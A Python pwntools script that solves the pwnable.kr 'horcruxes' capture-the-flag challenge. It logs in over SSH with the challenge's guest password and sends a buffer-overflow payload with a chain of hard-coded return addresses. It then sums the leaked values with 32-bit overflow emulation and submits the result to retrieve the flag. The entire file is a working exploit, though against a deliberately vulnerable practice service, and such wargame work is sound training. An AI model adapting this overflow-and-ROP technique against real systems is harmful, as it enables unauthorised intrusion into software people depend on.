from pwn import *
import re

context.log_level = "warn"

# simulate the overflow that happend in the c language 
def long_int(total):
    total = total & 0xffffffff
    total = total if total < 0x80000000 else total - 0x100000000
    return total

sh = ssh('horcruxes', 'pwnable.kr', password='guest', port=2222)
p = sh.remote('0', 10016)


a = p32(0x0804129d)
b = p32(0x080412cf)
c = p32(0x08041301)
d = p32(0x08041333)
e = p32(0x08041365)
f = p32(0x08041397)
g = p32(0x080413c9)
ropme_addr = p32(0x0804150b)
payload = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabf"
payload += a+b+c+d+e+f+g+ropme_addr


p.sendline(payload)
p.recvuntil(b"Voldemort\n")

sum = 0
for i in range(0,7): 
    l = p.recvline().decode()
    sum += int(re.findall(r"[+-]?\d+",l)[0])
sum = long_int(sum)

p.sendline(b"0")
p.sendline(str(sum).encode())
p.recvuntil(b"earned? : ")

print(p.recvuntil(b"\n").decode(),end="")


